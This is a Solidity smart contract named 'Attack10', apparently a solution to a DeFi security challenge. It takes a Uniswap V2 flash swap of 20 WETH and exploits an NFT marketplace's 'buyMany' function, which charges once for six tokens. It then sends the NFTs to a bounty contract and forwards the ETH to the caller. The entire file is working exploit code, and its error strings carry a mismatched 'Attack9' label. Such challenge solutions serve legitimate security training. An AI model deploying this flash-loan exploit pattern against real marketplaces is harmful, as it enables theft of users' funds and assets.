// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external;
}

interface IUniswapV2Pair {
    function token0() external view returns (address);

    function token1() external view returns (address);

    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

interface IWeth is IERC20 {
    function deposit() external payable;

    function withdraw(uint wad) external;
}

contract Attack10 is IUniswapV2Callee, IERC721Receiver {
    IUniswapV2Pair private immutable uniswapPair;
    IMarketplace private immutable marketplace;
    address private immutable devsContract;
    IWeth public immutable weth;
    IERC20 public immutable token;
    IERC721 public immutable nft;

    uint256 private immutable AMOUNT_TO_BORROW = 20 ether;

    constructor(
        address _uniswapPair,
        address _marketplace,
        address _devsContract,
        address _weth,
        address _token,
        address _nft
    ) {
        uniswapPair = IUniswapV2Pair(_uniswapPair);
        marketplace = IMarketplace(_marketplace);
        devsContract = _devsContract;
        weth = IWeth(_weth);
        token = IERC20(_token);
        nft = IERC721(_nft);
    }

    receive() external payable {}

    function attack() external {
        bytes memory data = abi.encode(msg.sender);

        // Get ETH via flashswap
        address token0 = uniswapPair.token0();
        address token1 = uniswapPair.token1();
        uint256 amount0Out = address(weth) == token0 ? AMOUNT_TO_BORROW : 0;
        uint256 amount1Out = address(weth) == token1 ? AMOUNT_TO_BORROW : 0;

        uniswapPair.swap(amount0Out, amount1Out, address(this), data);

        // Transfer 6 NFTs to devsContract with beneficairy address as data
        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), devsContract, i, data);
        }

        // Transfer ETH back to player
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "Attack9: ETH transfer failed");
    }

    function uniswapV2Call(address, uint256, uint256, bytes calldata) external {
        require(msg.sender == address(uniswapPair), "Attack9:: invalid sender");

        // Swap WETH for ETH
        weth.withdraw(AMOUNT_TO_BORROW);
        require(
            address(this).balance >= AMOUNT_TO_BORROW,
            "Attack9: insufficient ETH"
        );

        // Buy 6 NFTs from marketplace
        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }
        marketplace.buyMany{value: 15 ether}(tokenIds);

        // Repay flashswap with fee
        uint256 fee = ((AMOUNT_TO_BORROW * 3) / 997) + 1;
        uint256 amountToRepay = AMOUNT_TO_BORROW + fee;
        weth.deposit{value: amountToRepay}();
        require(
            weth.balanceOf(address(this)) >= amountToRepay,
            "Attack9: insufficient WETH"
        );
        weth.transfer(address(uniswapPair), amountToRepay);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
